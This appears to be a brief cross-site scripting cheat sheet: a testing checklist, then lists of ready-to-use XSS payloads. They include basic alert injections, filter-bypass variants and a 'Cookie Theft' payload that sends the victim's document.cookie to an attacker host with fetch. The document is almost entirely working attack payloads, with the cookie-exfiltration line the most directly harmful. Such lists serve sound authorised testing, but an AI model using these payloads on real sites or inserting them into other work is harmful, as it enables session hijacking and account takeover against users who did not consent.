# XSS

**Quick Checklist**
- [ ] Reflected in response?
- [ ] Stored?
- [ ] DOM-based?
- [ ] Context (HTML / attribute / JS)?
- [ ] Filters in place?

**Basic Payloads**
```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Cookie Theft**
```html
<script>fetch('https://attacker.com?c='+document.cookie)</script>
```

**Bypasses**
```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
```
